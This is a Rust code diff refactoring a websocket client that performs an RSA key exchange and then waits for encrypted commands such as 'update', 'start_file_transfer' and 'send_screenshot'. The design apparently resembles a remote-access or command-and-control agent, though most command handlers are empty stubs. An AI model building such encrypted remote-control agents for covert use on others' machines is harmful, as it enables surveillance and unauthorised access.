@@ -1,9 +1,9 @@
-mod file_reciever;
+mod feature;
 mod hybrid_decryption;
-mod screenshot_sender;
 
-use std::{str::from_utf8, thread, time::Duration};
+use std::time::Duration;
 
+use feature::{update::Update, Feature};
 use futures_util::{
     stream::{SplitSink, SplitStream},
     SinkExt, StreamExt,
@@ -11,11 +11,9 @@ use futures_util::{
 use gethostname::gethostname;
 use hybrid_decryption::HybridDecryption;
 use rsa::{
-    pkcs1::{DecodeRsaPublicKey, EncodeRsaPrivateKey, EncodeRsaPublicKey},
-    pkcs8::DecodePublicKey,
+    pkcs1::{DecodeRsaPublicKey, EncodeRsaPublicKey},
     Pkcs1v15Encrypt, RsaPrivateKey, RsaPublicKey,
 };
-use screenshots::image::EncodableLayout;
 use tokio_tungstenite::{
     connect_async,
     tungstenite::{handshake::client::Response, Message},
@@ -97,24 +95,16 @@ impl Connector {
     }
     pub async fn subscribe_to_updates(&mut self) {
         loop {
-            let mut hybrid_decryption_arguments: [Vec<u8>; 3] =
-                [Vec::new(), Vec::new(), Vec::new()];
-            for index in 0..3 {
-                if let Some(message) = self.read.as_mut().unwrap().next().await {
-                    //cant put hex decode in the decrypt fn cuz it cant accept
-                    hybrid_decryption_arguments[index] =
-                        hex::decode(message.unwrap().to_string()).unwrap();
-                }
-            }
-            let hybrid_decryption = HybridDecryption::new(
-                hybrid_decryption_arguments[0].clone(),
-                hybrid_decryption_arguments[1].clone(),
-                hybrid_decryption_arguments[2].clone(),
-            );
-            let decrypted_message = hybrid_decryption.decrypt(self.private_key.clone());
+            let decrypted_message = self.accept_encrypted_message().await;
             match decrypted_message.as_str() {
                 "update" => {
                     println!("got an update request");
+                    let update = Update::new();
+                    //send callback
+                    match update.run(self).await {
+                        feature::Result::SUCCESFUL => {}
+                        feature::Result::FAILED => {}
+                    }
                 }
                 "start_file_transfer" => {}
                 "send_screenshot" => {}
@@ -142,39 +132,12 @@ impl Connector {
                 .await
                 .unwrap();
 
-            let mut hybrid_decryption_arguments: [Vec<u8>; 3] =
-                [Vec::new(), Vec::new(), Vec::new()];
-            for index in 0..3 {
-                if let Some(message) = self.read.as_mut().unwrap().next().await {
-                    hybrid_decryption_arguments[index] =
-                        hex::decode(message.unwrap().to_string()).unwrap();
-                }
-            }
-            let hybrid_decryption = HybridDecryption::new(
-                hybrid_decryption_arguments[0].clone(),
-                hybrid_decryption_arguments[1].clone(),
-                hybrid_decryption_arguments[2].clone(),
-            );
-
-            self.public_key = Some(
-                RsaPublicKey::from_pkcs1_pem(
-                    hybrid_decryption.decrypt(self.private_key.clone()).as_str(),
-                )
-                .unwrap(),
-            );
+            let decrypted_message = self.accept_encrypted_message().await;
+            self.public_key = Some(RsaPublicKey::from_pkcs1_pem(&decrypted_message).unwrap());
             println!("rsa init sequence complete");
 
             self.subscribe_to_updates().await;
         }
-    }
-    pub async fn encrypt_data(&self, data: String) -> Vec<u8> {
-        let mut rng = rand::thread_rng();
-        self.public_key
-            .clone()
-            .unwrap()
-            .encrypt(&mut rng, Pkcs1v15Encrypt, data.as_bytes())
-            .unwrap()
-            .to_vec()
     }
     pub fn decrypt_data(&self, data: &[u8]) -> String {
         let decrypted_data = self
@@ -182,6 +145,22 @@ impl Connector {
             .decrypt(Pkcs1v15Encrypt, hex::decode(data).unwrap().as_slice())
             .unwrap();
         String::from_utf8(decrypted_data).unwrap()
+    }
+    pub async fn accept_encrypted_message(&mut self) -> String {
+        let mut hybrid_decryption_arguments: [Vec<u8>; 3] = [Vec::new(), Vec::new(), Vec::new()];
+        for index in 0..3 {
+            if let Some(message) = self.read.as_mut().unwrap().next().await {
+                //cant put hex decode in the decrypt fn cuz it cant accept
+                hybrid_decryption_arguments[index] =
+                    hex::decode(message.unwrap().to_string()).unwrap();
+            }
+        }
+        let hybrid_decryption = HybridDecryption::new(
+            hybrid_decryption_arguments[0].clone(),
+            hybrid_decryption_arguments[1].clone(),
+            hybrid_decryption_arguments[2].clone(),
+        );
+        hybrid_decryption.decrypt(self.private_key.clone())
     }
 }
 pub fn generate_private_key() -> RsaPrivateKey {
